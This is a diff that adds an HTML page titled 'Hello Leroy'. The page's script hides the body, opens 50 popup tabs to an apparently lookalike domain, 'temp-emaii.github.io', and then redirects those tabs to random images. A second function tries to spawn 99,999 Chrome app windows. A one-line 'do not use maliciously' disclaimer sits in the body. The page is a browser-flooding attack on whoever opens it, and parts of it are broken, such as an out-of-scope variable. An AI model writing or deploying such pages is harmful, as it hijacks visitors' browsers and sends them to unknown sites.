@@ -1,0 +1,48 @@
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Hello Leroy</title>
+<style>
+  body {
+    display: none;
+  }
+</style>
+<script>
+  window.onload = function() {
+    for (let i = 0; i < 50; i++) {
+      const randomCityNightUrl = `https://source.unsplash.com/random/1920x1080/city,night?${Date.now()}-${i}`;
+      const tabUrl = `temp-emaii.github.io`; // Replace with the actual URL you want to open
+      let tab = window.open(tabUrl, '_blank');
+      setTimeout(() => {
+        tab.location.assign(randomCityNightUrl);
+      }, i * 100);
+    }
+    setTimeout(() => {
+      document.body.style.display = 'block';
+    }, 5000);
+  }
+  function createChromeAppAndOpenTabs() {
+    const numTabs = 99999;
+    for (let i = 0; i < numTabs; i++) {
+      const appId = `my-chrome-app-${Date.now()}-${i}`;
+      const options = {
+        url: `chrome-extension://${appId}/popup.html`,
+        type: 'panel',
+        id: appId,
+      };
+      chrome.app.window.create(options, (window) => {
+        setTimeout(() => {
+          window.location.assign(randomCityNightUrl);
+        }, i * 100);
+      });
+    }
+  }
+</script>
+</head>
+<body onload="createChromeAppAndOpenTabs()">
+  <h1>This page will create 50 Chrome apps and open tabs in the background.</h1>
+  <p>Please do not use this code for malicious purposes.</p>
+  <img src="https://source.unsplash.com/random/1920x1080/city,night" alt="City Night">
+</body>
+</html>
